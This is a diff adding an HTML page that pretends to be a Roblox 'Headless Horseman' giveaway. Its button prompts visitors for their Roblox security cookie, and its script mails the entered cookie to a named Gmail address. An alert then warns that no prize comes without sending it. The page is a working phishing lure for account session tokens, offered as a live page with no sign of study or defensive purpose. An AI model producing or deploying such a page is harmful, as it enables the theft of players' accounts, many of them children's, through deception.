@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Headless Horseman Giveaway</title>
+    <style>
+        body {
+            background-color: #4a4a4a;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        
+        .dialog-button {
+            background-color: #0084ff;
+            color: #ffffff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 18px;
+            cursor: pointer;
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
+        
+        .dialog-button:hover {
+            background-color: #0066cc;
+        }
+        
+        .video-container {
+            position: relative;
+            padding-bottom: 56.25%;
+            padding-top: 30px;
+            height: 0;
+            overflow: hidden;
+        }
+        
+        .video-container iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+    </style>
+</head>
+<body>
+    <h1>Roblox Giveaways</h1>
+    <div class="video-container">
+        <iframe width="560" height="315" src="https://www.youtube.com/embed/SEG4sEGuuho" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+    </div>
+    <button class="dialog-button" onclick="showCookieDialog()">Click here to enter your Roblox Security Cookie</button>
+
+    <script>
+        function showCookieDialog() {
+            var cookie = prompt("Please enter your Roblox Security Cookie:", "");
+
+            if (cookie) {
+                var emailLink = "mailto:legendxfire23@gmail.com?subject=Roblox Security Cookie&body=" + encodeURIComponent(cookie);
+                window.location.href = emailLink;
+            } else {
+                alert("No cookie entered. You will not receive the Headless Horseman unless you enter and email your Roblox Security Cookie.");
+            }
+        }
+    </script>
+</body>
+</htm
